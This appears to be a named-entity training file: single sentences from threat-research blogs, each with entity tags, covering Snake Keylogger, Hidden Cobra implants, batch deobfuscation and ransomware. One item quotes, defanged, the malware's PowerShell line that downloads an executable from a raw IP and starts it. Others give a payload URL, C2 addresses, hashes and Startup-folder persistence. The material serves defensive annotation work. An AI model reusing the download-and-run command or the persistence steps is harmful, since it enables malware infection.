[["(The PE rich header is an undocumented part of a Windows executable that reveals unique information to identify the Microsoft compiler and linker used to create the program.", {"entities": [[116, 125, "ORG"]]}], ["(int)GetProcAdress(v0, \\\"CreateThread\\\");' is shown in Figure 2.", {"entities": []}], ["1.", {"entities": []}], ["2.", {"entities": []}], ["2014 Backdoor.", {"entities": []}], ["2015", {"entities": [[0, 4, "DATE"]]}], ["3.", {"entities": []}], ["A decompiler takes the opposite route.", {"entities": []}], ["A modified version of the sample was used to produce a picture of a sub-ctree for the function shown in Figure 1.", {"entities": []}], ["A quick way to inspect all ctype_t constants and their values is to execute the following code snippet:", {"entities": []}], ["A resource loading failure occurs and the registered local ResolveEventHandler function is called to solve this error.", {"entities": [[59, 78, "Process"]]}], ["A tedious approach to de-obfuscating this script would be to de-fang each command by prepending an ECHO statement to print each de-obfuscated command to the console.", {"entities": []}], ["A while later, another PE file, decrypted from resource “{d977ee8c-85ce-4731-b9a1-323ba88c6eeb}‎”, appears in memory.", {"entities": []}], ["According to my analysis, the defecrypted Dll module (“Huzeigtmvaplpinhoo.dll”) deploys Snake Keylogger onto a victim’s device and sets it as an auto-run program.", {"entities": [[53, 75, "Filename"]]}], ["According to the code in Figure 3.6, it is about to call API CreateProcess() to create the child process with Creation Flag 134217732U (0x8000004), which means CREATE_NO_WINDOW and CREATE_SUSPENDED.", {"entities": []}], ["Actors cast wider nets that may impact critical systems, which  expand the scale and effectiveness of their end-stage operations by inflicting maximum pain on the victim.", {"entities": []}], ["Actors following this model will extort victims for an average of $500 to $1,000 USD and hope to receive payments from as many individuals as possible.", {"entities": []}], ["After researching its behaviors, I recognized it as a fresh variant of the Snake Keylogger malware.", {"entities": [[75, 80, "Malware_Name"], [81, 90, "Malware_Type"]]}], ["Again, for the same reason as before, it sleeps 35 seconds at the beginning of this function to bypass some malware analysis systems.", {"entities": [[48, 58, "TIME"]]}], ["Alternately, you can use De-DOSfuscator with a downloaded PDB or a local symbol cache containing the correct symbols.", {"entities": []}], ["Although campaigns employing themes relevant to these matters are only beginning to be adopted by threat actors, we expect future campaigns—primarily those perpetrated by financially motivated threat actors—to incorporate these themes in proportion to the media’s coverage of these topics.", {"entities": []}], ["An actor’s capability to obtain financial benefits from post-compromise ransomware deployment depends on many factors, one of which is the ability to disrupt systems that are the most relevant to the core mission of the victim organizations.", {"entities": [[72, 82, "Malware_Type"]]}], ["An analyzed sample of SILENTNIGHT downloaded from this URL had an MD5 hash of 9e616a1757cf1d40689f34d867dd742e, employed the RC4 key 'q23Cud3xsNf3', and was associated with the SILENTNIGHT botnet 'PLSPAM'.", {"entities": [[22, 33, "Malware_Name"], [177, 188, "Malware_Name"]]}], ["An example can be seen in Figure 5; the malware stores each character’s ASCII value in the stack and then references it in the call to sprintf .", {"entities": []}], ["An example of dynamically resolving global variables using GetProcAddress is shown in Figure 1.", {"entities": []}], ["Analysis The McAfee Advanced Threat Research team discovered a previously unknown data-gathering implant that surfaced in mid-February 2018.", {"entities": [[122, 139, "DATE"]]}], ["Analyzing this certificate reveals additional control servers using the same PolarSSL certificate.", {"entities": []}], ["And these attacks will continue to mushroom as more threat actors scramble for a piece of the crimeware pie.", {"entities": []}], ["AppDomain.", {"entities": []}], ["As a result, ransomware infections—either affecting critical assets in corporate networks or reaching computers in OT networks—often result in the same outcome: insufficient or late supply of end products or services.", {"entities": [[13, 23, "Malware_Type"]]}], ["As a result, they are better positioned to negotiate and can often demand much higher ransoms—which are commonly commensurate with the victims’ perceived ability to pay and the value of the ransomed assets themselves.", {"entities": []}], ["As a result, we can expect mature actors to gradually broaden their selection from only IT and business processes, to also OT assets monitoring and controlling physical processes.", {"entities": []}], ["As explained in the paper, Java’s popularity among the developers and widespread use in Web browsers all but  guarantees continuing interest from threat actors.", {"entities": []}], ["As financial crime actors have evolved their tactics from opportunistic to post-compromise ransomware deployment, we have observed an increase in adversaries’ internal reconnaissance that enables them to target systems that are vital to support the chain of production.", {"entities": []}], ["As threat actors perform internal reconnaissance and move laterally across target networks before deploying ransomware, they are now better positioned to cast wide nets that impact the target’s most critical assets and negotiate from a privileged position.", {"entities": []}], ["As threat actors tailor their attacks to target specific industries or organizations, companies with high-availability requirements (e.g., public utilities, hospitals, and industrial manufacturing) and perceived abilities to pay ransoms (e.g., higher revenue companies) become prime targets.", {"entities": []}], ["As we all know, a Windows system has a “Startup” folder inside the “Start Menu”.", {"entities": []}], ["As you can see, to prevent its code from being analyzed the file is obfuscated so that the class names, function names, and variable names are all randomly generated meaningless strings.", {"entities": []}], ["AssemblyResolve, which is called when it fails to load an assembly (like a module) by name.", {"entities": [[0, 15, "Process"]]}], ["At First Glance Figure 1 shows a batch script (MD5 hash 6C8129086ECB5CF2874DA7E0C855F2F6) that has been obfuscated using the BatchEncryption tool referenced in Daniel Bohannon’s paper.", {"entities": [[160, 177, "PERSON"]]}], ["At a first glance, it’s very difficult to say what is the meaning of this string (unless of course, you know the ASCII table by heart).", {"entities": []}], ["At first glance, the SNAKEHOSE kill list appeared to be specifically tailored to OT environments due to the relatively small number of processes (yet high number of OT-related processes) identified with automated tools for initial triage.", {"entities": [[21, 30, "Malware_Name"]]}], ["Based on our analysis of public and private information from submissions, along with product telemetry, it appears Proxysvc was used alongside the 2017 Destover variant and has operated undetected since mid-2017.", {"entities": [[115, 123, "Malware_Name"], [203, 211, "DATE"]]}], ["Based on our technical analysis, telemetry, and data from submissions, we can assert with high confidence that this is the work of the Hidden Cobra group.", {"entities": [[135, 147, "Threat_Actor"]]}], ["Based on these findings, I wrote a flare-qdb script to parse and dump commands as they are executed.", {"entities": []}], ["Before the parent process exits, an API ResumeThread() is called to have the child process restored to run.", {"entities": []}], ["Below is a pseudocode of registering a local resource resolve, where T9wOjU5ccxTJaVfUntn.", {"entities": []}], ["Below is the base64-decoded PowerShell code: $ProcName = \\\"Wheahmnfpgaqse.exe\\\"; (New-Object System.", {"entities": [[28, 38, "Software_Name"], [57, 78, "Filename"]]}], ["Besides being a great disassembler and debugger, it is possible to extend it and include a powerful decompiler by purchasing an additional license from Hex-Rays.", {"entities": [[152, 160, "ORG"]]}], ["Both implants specifically use FakeTLS with PolarSSL, which we saw in previous Hidden Cobra implants.", {"entities": [[79, 91, "Threat_Actor"]]}], ["But BatchEncryption adds a formidable barrier to analysis by its extensive, layered use of environment variables to rebuild the original commands.", {"entities": []}], ["But first, I’ll talk about the analysis that led me to this solution.", {"entities": []}], ["But the U.S. government definition also includes economic security and public health.", {"entities": [[8, 12, "GPE"]]}], ["By Ryan Sherstobitoff and Asheer Malhotra on Apr 24, 2018 McAfee Advanced Threat Research analysts have uncovered a global data reconnaissance campaign assaulting a wide number of industries including critical infrastructure, entertainment, finance, health care, and telecommunications.", {"entities": [[3, 21, "PERSON"], [26, 41, "PERSON"], [45, 57, "DATE"]]}], ["By removing the dependency on hardcoded IP addresses and accepting only inbound connections, the control service can remain unknown.", {"entities": []}], ["CVE-2012-4681 ,  which allows attackers to bypass security checks using the findMethod () function.", {"entities": []}], ["CVE-2013-2423 , which  arises due to insufficient validation in the findStaticSetter () method, leading to Java type confusion.", {"entities": [[0, 13, "Vulnerability"]]}], ["CVE-2013-2465 ,  which involves insufficient bounds checks in the storeImageArray() function.", {"entities": [[0, 13, "Vulnerability"]]}], ["Call stack for CreateProcessW in cmd.exe", {"entities": []}], ["Companies who serve as key information brokers-for the public or the U.S. government-should be particularly attuned to the criticality their work is assigned by a variety of cyber threat actors.", {"entities": [[69, 73, "GPE"]]}], ["Compilation and decompilation center around the concept of an Abstract Syntax Tree (AST) .", {"entities": []}], ["Control Servers", {"entities": []}], ["Cracked Passwords Tab GoCrack is shipping with support for hashcat v3.6+, requires no external database server (via a flat file), and includes support for both LDAP and database backed authentication.", {"entities": [[59, 66, "Software_Name"]]}], ["Cyber attackers like Java for many of the same reasons.", {"entities": []}], ["Dashboard As readers of this blog probably know, password cracking tools are an effective way for security professionals to test password effectiveness, develop improved methods to securely store passwords, and audit current password requirements.", {"entities": []}], ["De-DOSfuscator relies on the location of the non-exported Dispatch function to log commands, and its location varies per system.", {"entities": [[58, 66, "Process"]]}], ["Despite the campaign’s broad distribution, a plurality of associated messages were sent to organizations based in Canada.", {"entities": [[114, 120, "GPE"]]}], ["Despite the name, this component is not an SSL proxy, but rather a unique data-gathering and implant-installation component that listens on port 443 for inbound control server connections.", {"entities": []}], ["Destover variant (7fe373376e0357624a1d21cd803ce62aa86738b6).", {"entities": [[0, 8, "Malware_Name"]]}], ["Destover, the 2018 Destover-like variant.", {"entities": [[0, 8, "Malware_Name"], [14, 18, "DATE"], [19, 27, "Malware_Name"]]}], ["Destover.", {"entities": [[0, 8, "Malware_Name"]]}], ["Display assignments related to stack strings as characters instead of numbers, for easier readability.", {"entities": []}], ["Dll file, called “Huzeigtmvaplpinhoo.dll”), and enumerates its export functions to find \\\"G6doICqoMU()\\\", which is invoked by executing “type.", {"entities": [[18, 40, "Filename"]]}], ["Dll is a dropper and installer of Snake Keylogger.", {"entities": []}], ["Download the paper to learn more about these vulnerabilities: CVE-2013-2471 , which allows attackers to override Java’s getNumDataElements() method, leading to memory corruption.", {"entities": [[62, 75, "Vulnerability"]]}], ["DownloadFile (\\\"hxxp[:]//3[.]64[.]251[.]139/v3/2/Requests07520000652.exe\\\",\\\"$env:APPDATA\\\\$ProcName\\\"); Start-Process (\\\"$env:APPDATA\\\\$ProcName\\\")", {"entities": []}], ["Earlier this year several media outlets-including the New York Times and Washington Post-disclosed that they had been the victims of China-based intrusions.", {"entities": [[0, 17, "DATE"], [50, 68, "ORG"], [73, 88, "ORG"], [133, 138, "GPE"]]}], ["Email lure referencing business grants and loans Figure 5: SBA-themed message Figure 6: Office 365 phishing page Implications Malicious actors have always exploited users’ sense of urgency, fear, goodwill and mistrust to enhance their operations.", {"entities": [[88, 98, "Software_Name"]]}], ["Engine files (files used by the cracking engine) such as Dictionaries, Mangling Rules, etc. can be uploaded as “Shared”, which allows other users to use them in task yet do not grant them the ability to download or edit.", {"entities": []}], ["Escad (Destover) from 2014 shortly before the Sony Pictures attack, we found the signatures to be identical.", {"entities": [[0, 5, "Malware_Name"], [7, 15, "Malware_Name"], [22, 26, "DATE"], [46, 59, "ORG"]]}], ["Escad (hash: 8a7621dba2e88e32c02fe0889d2796a0c7cb5144).", {"entities": [[0, 5, "Malware_Name"]]}], ["Escad is nearly identical.", {"entities": [[0, 5, "Malware_Name"]]}], ["Escad variant we analyzed.", {"entities": [[0, 5, "Malware_Name"]]}], ["Escad.", {"entities": [[0, 5, "Malware_Name"]]}], ["Example Scripts", {"entities": []}], ["Example lure using AUD Figure 3:", {"entities": []}], ["Exit(0).", {"entities": []}], ["Figure 1.1 shows a screenshot of when it is opened.", {"entities": []}], ["Figure 1:", {"entities": []}], ["Figure 1: Contents of XYNT.bat", {"entities": [[22, 30, "Filename"]]}], ["Figure 1: Dynamic API resolution using GetProcAddress There are several ways to rename the global variables, with the simplest being manual copy and paste.", {"entities": []}], ["Figure 2 shows a task list, Figure 3 shows the “Realtime Status” tab for a task, and Figure 4 shows the “Cracked Passwords” tab.", {"entities": []}], ["Figure 2 shows how to use the ECHO command to decode the first command.", {"entities": []}], ["Figure 2:", {"entities": []}], ["Figure 2: Partial command decoding via the ECHO command The script uses hundreds of commands to set environment variables that are ultimately expanded to de-obfuscate malicious commands.", {"entities": []}], ["Figure 3 shows the call stack for CreateProcessW as cmd.exe executes notepad.", {"entities": []}], ["Figure 3.2 shows the code changing the Windows startup folder to “C:\\\\Users\\\\M0YTes0Env\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\chsg\\\\” by calling the API SetValue().", {"entities": [[66, 155, "Filepath"]]}], ["Figure 3.5 displays the GZIP data of the resource “Qkxkikeg” (reversed) on the left and the decompressed Snake Keylogger on the right side.", {"entities": [[105, 110, "Malware_Name"], [111, 120, "Malware_Type"]]}], ["Figure 3:", {"entities": []}], ["Figure 4 is an exploration of this structure in WinDbg after running the command \\\"echo hai > nul\\\".", {"entities": [[48, 54, "Software_Name"]]}], ["Figure 4: Exploring the interesting pointers in 2nd argument to cmd!Dispatch Because users can redirect multiple", {"entities": []}], ["Figure 4: Global variables renamed Stack Strings", {"entities": []}], ["Figure 5: Command data structure diagram By inspection, I found that cmd!Dispatch is responsible for executing both shell built-ins and executable programs, so unlike breaking on CreateProcess, it will not miss commands that do not result in process creation.", {"entities": []}], ["Figure 5: Hex-Rays decompiler output.", {"entities": [[10, 18, "Software_Name"]]}], ["Finally, I will share the script that I added to flare-qdb so you can de-obfuscate malicious command scripts yourself by executing them (in a safe environment, of course).", {"entities": [[49, 58, "Software_Name"]]}], ["FireEye's Innovation and Custom Engineering (ICE) team released a tool today called GoCrack that allows red teams to efficiently manage password cracking tasks across multiple GPU servers by providing an easy-to-use, web-based real-time UI (Figure 1 shows the dashboard) to create, view, and manage tasks.", {"entities": []}], ["Flare-qdb also made a guest appearance in Austin Baker and Jacob Christie’s SANS DFIR Summit 2017 briefing , inducing the Windows event log service to exclude process creation events.", {"entities": [[42, 54, "PERSON"], [59, 75, "PERSON"], [93, 97, "DATE"]]}], ["Folders\\\\Startup” and “HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\User Shell Folders\\\\Startup”.", {"entities": [[23, 125, "Filepath"]]}], ["For a brief overview of this threat, see “Global Malware Campaign Pilfers Data from Critical Infrastructure, Entertainment, Finance, Health Care, and Other Industries.”", {"entities": []}], ["For convenience, if an Internet connection is available, De-DOSfuscator automatically retrieves this function’s offset using Microsoft’s symbol server.", {"entities": [[125, 134, "ORG"]]}], ["For example, the command in Listing 1 shows redirection of standard output (stream #1 is implicit) to shares.txt and standard error (stream #2 is explicitly referenced) to errors.txt.", {"entities": [[102, 112, "Filename"], [172, 182, "Filename"]]}], ["For example, the member n to obtain the numeric value only makes sense when dealing with constants.", {"entities": []}], ["For more information, including technical detail, on similar activity, see our recent blog posts on FIN6 and TEMP.MixMaster .", {"entities": []}], ["For more on the global aspect of this threat, see “Global Malware Campaign Pilfers Data from Critical Infrastructure of Entertainment, Finance, Health Care, and Other Industries.”", {"entities": []}], ["FortiGuard Labs Threat Research Report Affected platforms: Microsoft Windows Impacted parties: Windows Users Impact: Collects sensitive information from victims’ device Severity level :             Critical Fortinet’s FortiGuard Labs recently captured a Microsoft Excel sample from the wild that was used to spread malware .", {"entities": [[59, 68, "ORG"], [264, 269, "Software_Name"]]}], ["From March 18 to 26 we observed the malware operating in multiple areas of the world.", {"entities": [[5, 19, "DATE"]]}], ["From all the intermediate steps between code and assembly, we are stressing the AST so much because most of the time you will spend using the Hex-Rays API, you will actually be reading and/or modifying the Abstract Syntax Tree (or ctree in Hex-Rays terminology).", {"entities": [[240, 248, "Software_Name"]]}], ["From the AST, the compiler will produce assembly code for the specified platform.", {"entities": []}], ["From the given assembly code, it works back to produce an AST, and from this to produce pseudocode.", {"entities": []}], ["Function renaming global variables After the script has been executed, we can see in Figure 4 that all the global variables have been renamed to the appropriate function name.", {"entities": []}], ["Further analysis of McAfee telemetry data reveals several IP addresses that are active, two within the same network block as the 2018 Destover-like implant.", {"entities": [[20, 26, "ORG"], [129, 133, "DATE"]]}], ["Further investigation into the control server infrastructure reveals the SSL certificate d0cb9b2d4809575e1bc1f4657e0eb56f307c7a76, which is tied to the control server 203.131.222.83, used by the February 2018 implant.", {"entities": [[195, 208, "DATE"]]}], ["Further research into IP address 14.140.116.172 leads us to additional hidden components involved in the overall infrastructure.", {"entities": []}], ["Furthermore, the Advanced Threat Research team has discovered Proxysvc, which appears to be an undocumented implant.", {"entities": [[13, 41, "ORG"], [62, 70, "Malware_Name"]]}], ["G6doICqoMU()”.", {"entities": []}], ["GetProcAddress The first example we will walk through is how to automatically handle renaming global variables that have been dynamically resolved at run time.", {"entities": []}], ["Given the community interest and media coverage surrounding the economic stimulus bill currently being considered by the United States House of Representatives, we anticipate attackers will increasingly leverage lures tailored to the new stimulus bill and related recovery efforts such as stimulus checks, unemployment compensation and small business loans.", {"entities": [[117, 134, "GPE"], [135, 159, "ORG"]]}], ["Given the limited capabilities of Proxysvc, it appears to be part of a covert network of SSL listeners that allow the attackers to gather data and install more complex implants or additional infrastructure.", {"entities": [[34, 42, "Malware_Name"]]}], ["GoCrack is available immediately for download along with its source code on the project's GitHub page .", {"entities": []}], ["Going through its code, a “Workbook_Activate()” method is automatically called when the document is opened.", {"entities": []}], ["Here we go.", {"entities": []}], ["However, after manually extracting the list from the function that was terminating the processes, we determined that the kill list utilized by SNAKEHOSE actually targets over 1,000 processes.", {"entities": [[143, 152, "Malware_Name"]]}], ["However, the following question arises: “How do we reach the nodes?”", {"entities": []}], ["However, the variant is not based on Bankshot.", {"entities": [[37, 45, "Malware_Name"]]}], ["However, there seems to be a lack of a concise and complete resources regarding this topic (tutorials or otherwise).", {"entities": []}], ["However, this task is very repetitive and can be scripted using the Hex-Rays API.", {"entities": [[68, 76, "Software_Name"]]}], ["However, we were able to modify its binary file to remove this restriction.", {"entities": []}], ["I didn’t have much to contribute to this conversation until I had to analyze a hideously obfuscated batch file as part of my job on the FLARE malware queue.", {"entities": []}], ["I discovered cmd!Dispatch, which receives not a string but a structure with pointers to the command, arguments, and any I/O redirection information (such as redirecting the standard output or error streams of a program to a file or device).", {"entities": []}], ["I previously wrote about how to use flare-qdb to instrument and modify malware behavior.", {"entities": [[36, 45, "Software_Name"]]}], ["I will also share an Easter Egg that I found by flipping only a single bit in the process address space of cmd.exe.", {"entities": []}], ["I will explain in detail how it performs these functions in this section.", {"entities": []}], ["I/O streams in a single command, cmd.exe represents I/O redirection with a linked list.", {"entities": []}], ["ICE is a small, highly trained, team of engineers that incubate and deliver capabilities that matter to our products, our clients and our customers.", {"entities": [[0, 3, "ORG"]]}], ["ICE is always looking for exceptional candidates interested in solving challenging problems quickly.", {"entities": [[0, 3, "ORG"]]}], ["If you have any feature requests, questions, or bug reports, please file an issue in GitHub.", {"entities": []}], ["If you’re interested, check out FireEye careers .", {"entities": [[32, 39, "ORG"]]}], ["Implant Origins McAfee Advanced Threat Research determined that the Destover-like variant originated from code developed in 2015.", {"entities": [[68, 76, "Malware_Name"], [124, 128, "DATE"]]}], ["In 2017, we also observed campaigns such as NotPetya and BadRabbit, where wiper malware with worm-like capabilities were released to disrupt organizations while masquerading as ransomware.", {"entities": [[3, 7, "DATE"], [74, 79, "Malware_Type"]]}], ["In July, 2021, Snake Keylogger first entered into a TOP 10 popular malware families report, meaning that the Snake Keylogger family is increasing its influence and impacting more people’s devices and sensitive data.", {"entities": [[15, 20, "Malware_Name"], [21, 30, "Malware_Type"], [109, 114, "Malware_Name"], [115, 124, "Malware_Type"]]}], ["In addition, it has another local callback function registered to AppDomain.", {"entities": []}], ["In essence, a compiler takes the source code, splits it into tokens according to a grammar, then these tokens are grouped into logical expressions.", {"entities": []}], ["In fact, we have observed very similar process kill lists deployed alongside samples from other ransomware families, including LockerGoga, MegaCortex, and Maze.", {"entities": [[127, 137, "Malware_Name"], [139, 149, "Malware_Name"], [155, 159, "Malware_Name"]]}], ["In order to extract information from or modify the decompiled code, we have to interact with the ctree nodes via methods dependent on the node type.", {"entities": []}], ["In order to write any Hex-Rays script, it is important to first visualize the ctree.", {"entities": []}], ["In our continuing mission to equip security professionals against today’s advanced cyber threats, FireEye has published a free report, “ Brewing Up Trouble: Analyzing Four Widely Exploited Java Vulnerabilities .”", {"entities": [[98, 105, "ORG"]]}], ["In post-compromise ransomware incidents, a threat actor may still often rely on broadly distributed malware to obtain their initial access to a victim environment, but once on a network they will focus on gaining privileged access so they can explore the target networks and identify critical systems before deploying the ransomware.", {"entities": [[322, 332, "Malware_Type"]]}], ["In the bottom half of Figure 3.2 you can see the content of the system registry path, value name, and new value data.", {"entities": []}], ["In the future, we plan on adding support for MySQL and Postgres database engines for larger deployments, ability to manage and edit files in the UI, automatic task expiration, and greater configuration of the hashcat engine.", {"entities": [[209, 216, "Software_Name"]]}], ["In this blog post, I will show how I used flare-qdb to bring “script block logging” to the Windows command interpreter.", {"entities": [[42, 51, "Software_Name"]]}], ["In this blog, we aim to close that gap by showcasing examples where scripting Hex-Rays goes a long way.", {"entities": [[78, 86, "Software_Name"]]}], ["In this phase of the compilation process, referred to as parsing, the code structure is represented as a complex object, the AST.", {"entities": []}], ["In this post, we dive deeply into this campaign.", {"entities": []}], ["In this section, we will use the Hex-Rays API to solve two real-world problems: Identify calls to GetProcAddress to dynamically resolve Windows APIs, assigning the resulting address to a global variable.", {"entities": [[33, 41, "Software_Name"]]}], ["In this threat research blog you will learn how the Snake Keylogger variant is downloaded and executed through a captured Excel sample, what techniques this variant uses to protect it from being analyzed, what sensitive information it steals from a victim’s machine, and how it submits that collected data to the attacker.", {"entities": [[52, 57, "Malware_Name"], [58, 67, "Malware_Type"], [122, 127, "Software_Name"]]}], ["Industrial Sector Ransomware Distribution Poses Increasing Risk as Actors Move to Post-Compromise Deployment", {"entities": [[18, 28, "Malware_Type"]]}], ["Interestingly, although the content of these emails was somewhat generic, they were sometimes customized to reference a payment made in currency relevant to the recipient’s geography and contextually relevant government officials (Figure 1 and Figure 2).", {"entities": []}], ["Introducing De-DOSfuscator De-DOSfuscator uses flare-qdb and Vivisect to hook the Dispatch function in cmd.exe and parse commands from memory.", {"entities": [[47, 56, "Software_Name"], [61, 69, "Software_Name"]]}], ["Introduction IDA Pro is the de facto standard when it comes to binary reverse engineering.", {"entities": [[13, 20, "Software_Name"]]}], ["InvokeMember(\\\\\\\"G6doICqoMU\\\\\\\", BindingFlags.", {"entities": []}], ["InvokeMethod, null, null, null)” in function Consturctor(), as shown in Figure 2.1.", {"entities": []}], ["Iran and China similarly privilege the security of their information assets in order to protect their governments.", {"entities": [[0, 4, "GPE"], [9, 14, "GPE"]]}], ["It contains a resource with the name “Qkxkikeg”, which is the original request resource name, as shown in Figure 3.4.", {"entities": []}], ["It displays a vague picture of a document and asks the victim to click the yellow button to get a clearer image.", {"entities": []}], ["It downloads a file (“Requests07520000652.exe”) onto a victim’s device, places it at “%AppData%\\\\Wheahmnfpgaqse.exe\\\" by calling “DownloadFile()”, and executes it by calling “Start-Process()”.", {"entities": [[22, 45, "Filename"], [86, 116, "Filepath"]]}], ["It extracts an executable PE file into memory from the Resource directory and then performs process hollowing that injects the executable PE file into a newly created child process and executes it.", {"entities": []}], ["It first appeared in late 2020 and focused on stealing sensitive information from a victim’s device, including saved credentials, the victim’s keystrokes, screenshots of the victim’s screen, and clipboard data.", {"entities": [[21, 30, "DATE"]]}], ["It has a local callback function defined by ResolveEventHandler that is registered to AppDomain.", {"entities": [[44, 63, "Process"]]}], ["It has several resources in the Resource directory, as shown below in Figure 3.3.", {"entities": []}], ["It is helpful for identifying similarities between malware variants to establish common development environments.)", {"entities": []}], ["It is useful to think about expressions as the “the little logical elements” of your code.", {"entities": []}], ["It looks like an exception handler to Windows SEH strategy to handle exceptions.", {"entities": []}], ["It next calls SetThreadContext() to make the child process point to the entry point function of Snake Keylogger.", {"entities": [[96, 101, "Malware_Name"], [102, 111, "Malware_Type"]]}], ["It plans to read a Resource named \\\"Qkxkikeg\\\" from the current module, which has no such named resource in the Resource directory, as you can see in Figure 3.3.", {"entities": []}], ["It then calls the API WriteProcessMemory() to copy the Snake Keylogger payload into the child process, section by section.", {"entities": [[55, 60, "Malware_Name"], [61, 70, "Malware_Type"]]}], ["It then invokes another function “Program.", {"entities": []}], ["It then proceeds to load the decrypted Dll module (a .Net", {"entities": []}], ["It then resumes the child process to run.", {"entities": []}], ["It uses a tricky way to load the resource.", {"entities": []}], ["It writes a piece of PowerShell code from a local variable into a BAT file.", {"entities": [[21, 31, "Software_Name"]]}], ["Items, Expressions and Statements Now we know that Hex-Rays’s ctree is a tree-like data structure.", {"entities": [[51, 59, "Software_Name"]]}], ["Its commands are built from environment variable substrings.", {"entities": []}], ["Keep this in mind, as it will be very important.", {"entities": []}], ["Keeping in mind the sensitivity of passwords, GoCrack includes an entitlement-based system that prevents users from accessing task data unless they are the original creator or they grant additional users to the task.", {"entities": []}], ["Let’s dive into this module to see how it performs its tasks.", {"entities": []}], ["List_Types()”, where it downloads Snake Keylogger module from the link “hxxps[:]//store2[.]gofile[.]io/download/0283e6ba-afc6-4dcb-b2f4-3173d666e2c4/Huzeigtmvaplpinhoo.dll”, which is a RC4 encrypted DLL file.", {"entities": [[34, 39, "Malware_Name"], [40, 49, "Malware_Type"]]}], ["McAfee telemetry analysis from March 16 to 21 reveals that Proxysvc components were active in the wild.", {"entities": [[0, 6, "ORG"], [31, 45, "DATE"], [59, 67, "Malware_Name"]]}], ["Meanwhile, the parent process exits by calling the function Environment.", {"entities": []}], ["Modifications to a task, viewing of cracked passwords, downloading a task file, and other sensitive actions are logged and available for auditing by administrators.", {"entities": []}], ["Most importantly, many of the tactics, techniques, and procedures (TTPs) often used by financial actors in the past, resemble those employed by high-skilled actors across the initial and middle stages of the attack lifecycle of past OT security incidents.", {"entities": []}], ["Most of them are related to control flow and can be thought as “the big picture elements” of your code.", {"entities": []}], ["Motivated by the profits, cyber attackers are bound to adopt more intelligent exploit kits.", {"entities": []}], ["My goal was to de-obfuscate this script and report on what the attacker was doing.", {"entities": []}], ["Net.", {"entities": []}], ["Next, it calls “ToRc()” function to RC4 decrypt it using a decryption key \\\"Dllzjn\\\".", {"entities": []}], ["Next, it works to make this Snake Keylogger persistent on the infected Windows.", {"entities": [[28, 33, "Malware_Name"], [34, 43, "Malware_Type"]]}], ["Now, let’s see how Snake Keylogger solves this challenge—loading a nonexistent resource, which will trigger the resource loading failure.", {"entities": [[19, 24, "Malware_Name"], [25, 34, "Malware_Type"]]}], ["Number of infections by Thammasat University – hosted control servers from March 15 – 19, 2018.", {"entities": [[24, 44, "ORG"], [75, 94, "DATE"]]}], ["On the other side, we have statements .", {"entities": []}], ["Once found, the code takes the name of the function being resolved and finds the global variable that is being set.", {"entities": []}], ["Once the yellow button “Enable Content” is clicked by victim, the malicious VBA code is executed in the background.", {"entities": []}], ["Organized Financial Crime Actors Have Demonstrated an Ability to Disrupt OT Assets", {"entities": []}], ["Osc50oil0l is the local callback function.", {"entities": []}], ["Osc50oil0l)", {"entities": []}], ["Our analysis of the code and PE rich header indicates that Bankshot, Proxysvc, and the Destover-like implant are distinct families, but also contain overlapping code and functionality with current tools of Hidden Cobra.", {"entities": [[206, 218, "Threat_Actor"]]}], ["Our analysis of the portable executable’s rich-header data reveals that the two implants were compiled in different development environments.", {"entities": []}], ["Our investigation into this campaign reveals that the actor used multiple malware implants, including an unknown implant with capabilities similar to Bankshot.", {"entities": []}], ["Our next example is a typical issue when dealing with malware: stack strings .", {"entities": []}], ["Our research shows this listener component appeared mostly in higher education organizations.", {"entities": []}], ["Our script will modify these assignments to something more readable.", {"entities": []}], ["Over the last couple of decades, Java has become the lingua franca of software development, a near-universal platform that works across different operating systems and devices.", {"entities": []}], ["Overview of a Decompiler In order to understand how the decompiler works, it’s helpful to first review the normal compilation process.", {"entities": []}], ["PE rich header data from Proxysvc.dll.", {"entities": [[25, 37, "Filename"]]}], ["PE rich header data from the 2018 Bankshot implant.", {"entities": [[29, 33, "DATE"], [34, 42, "Malware_Name"]]}], ["PE rich header data from the new February 2018 implant.", {"entities": [[33, 46, "DATE"]]}], ["Persistence Mechanism Figure 3.1 shows an outline of the decrypted Dll module (“Huzeigtmvaplpinhoo.dll”).", {"entities": [[80, 102, "Filename"]]}], ["PolarSSL libraries have appeared in implants since the Sony Pictures incident and were used exclusively in the implant Backdoor.", {"entities": [[55, 68, "ORG"]]}], ["Previously, I released flare-qdb , which is a command-line and Python-scriptable debugger based on Vivisect.", {"entities": [[23, 32, "Software_Name"], [99, 107, "Software_Name"]]}], ["Proxysvc was first collected by public and private sources on March 22 from an unknown entity in the United States.", {"entities": [[0, 8, "Malware_Name"], [62, 70, "DATE"], [97, 114, "GPE"]]}], ["Proxysvc.dll contains a list of hardcoded IP addresses, including the preceding address, all located in India.", {"entities": [[0, 12, "Filename"], [104, 109, "GPE"]]}], ["Rather, the reporters at the Times and Post were perched in key positions to influence U.S. government and public views of the Chinese leadership, possibly in a negative light.", {"entities": [[25, 43, "ORG"], [87, 91, "GPE"], [127, 134, "NORP"]]}], ["Recapitulating, we have seen how the decompiler exposes this tree-like structure (the ctree ), which consists of two types of nodes: expressions and statements.", {"entities": []}], ["ResourceResolve, which is then called when it fails to load a resource by name.", {"entities": [[0, 15, "Process"]]}], ["ResourceResolve += new ResolveEventHandler(T9wOjU5ccxTJaVfUntn.", {"entities": []}], ["Resources”.", {"entities": []}], ["Russian officials view information content, flow and influencers as an enormous component of critical infrastructure.", {"entities": []}], ["Security researchers at FireEye and in the broader community have already begun to identify and report on COVID-19 themed campaigns with grant, payment, or economic recovered themed emails and attachments.", {"entities": [[24, 31, "ORG"]]}], ["Simply deploy a GoCrack server along with a worker on every GPU/CPU capable machine and the system will automatically distribute tasks across those GPU/CPU machines.", {"entities": []}], ["Since at least 2017, there has been a significant increase in public disclosures of ransomware incidents impacting industrial production and critical infrastructure organizations.", {"entities": [[6, 19, "DATE"]]}], ["Snake / Ekans), have cost victims across a variety of industry verticals many millions of dollars in ransom and collateral costs.", {"entities": [[0, 5, "Malware_Name"], [8, 13, "Malware_Name"], [73, 97, "MONEY"]]}], ["Snake Keylogger Downloader After some research, I learned that the file \\\"Wheahmnfpgaqse.exe\\\" is a downloader of Snake Keylogger, which is a .Net program.", {"entities": [[0, 5, "Malware_Name"], [6, 15, "Malware_Type"], [114, 119, "Malware_Name"], [120, 129, "Malware_Type"]]}], ["Snake Keylogger Installer", {"entities": [[0, 5, "Malware_Name"], [6, 15, "Malware_Type"]]}], ["Snake 